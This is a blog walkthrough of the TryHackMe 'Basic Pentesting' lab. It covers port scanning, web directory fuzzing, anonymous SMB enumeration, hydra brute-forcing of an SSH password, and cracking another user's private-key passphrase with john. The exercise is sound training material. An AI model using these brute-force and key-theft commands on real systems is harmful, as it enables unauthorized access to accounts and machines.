---
title: TryHackMe | Basic Pentesting
author: Zeropio
date: 2022-09-24
categories: [Pentesting, TryHackMe]
tags: [thm, linux]
permalink: /pentesting/tryhackme/basic-pentesting
---

# Foothold

The nmap show:

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```

In the webserver we found a plain html:

![Untitled](/assets/img/tryhackme/rooms/basic-pentesting/Untitled.png)

We can try fuzzing:

```console
zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u 'http://10.10.70.66/FUZZ'

	development             [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 65ms]
	server-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 82ms]
	                        [Status: 200, Size: 158, Words: 20, Lines: 11, Duration: 383ms]
```

There we can see some files talking about the smb. We can try listing it:

```console
zero@pio$ smbclient -N -L \\\\10.10.70.66\\                                                                

	        Sharename       Type      Comment
	        ---------       ----      -------
	        Anonymous       Disk      
	        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
	Reconnecting with SMB1 for workgroup listing.
	
	        Server               Comment
	        ---------            -------
	
	        Workgroup            Master
	        ---------            -------
	        WORKGROUP            BASIC2
```

We see an **Anonymous** folder. We can see it:

```console
zero@pio$ smbclient -N \\\\10.10.70.66\\Anonymous
	Try "help" to get a list of possible commands.
smb: \> ls
	  .                                   D        0  Thu Apr 19 18:31:20 2018
	  ..                                  D        0  Thu Apr 19 18:13:06 2018
	  staff.txt                           N      173  Thu Apr 19 18:29:55 2018
	
	                14318640 blocks of size 1024. 11087744 blocks available
smb: \> get staff.txt
```

Also, we can run `enum4linux` to see that info.

---

# Fingerprint

We the user now we can try bruteforcing into the ssh:

```console
zero@pio$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.70.66/ -t 4

	[22][ssh] host: 10.10.70.66   login: jan   password: armando
```

---

# Privilege Escalation

We found the other user in the system. There, we can see the `.ssh`{: .filepath} folder:

```console
jan@basic2:~$ ls -la ../kay/.ssh
	total 20
	drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
	drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
	-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
	-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
	-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

If we use the **id_rsa** we found that we need a passphrase. 

```console
zero@pio$ ssh kay@10.10.70.66 -i id_rsa
	Enter passphrase for key 'id_rsa':
```

We can use `john` for this:

```console
zero@pio$ ssh2john id_rsa > john_rsa
zero@pio$ john --wordlist=/usr/share/wordlists/rockyou.txt john_rsa
```

With it we can now log in in the system as **kay**.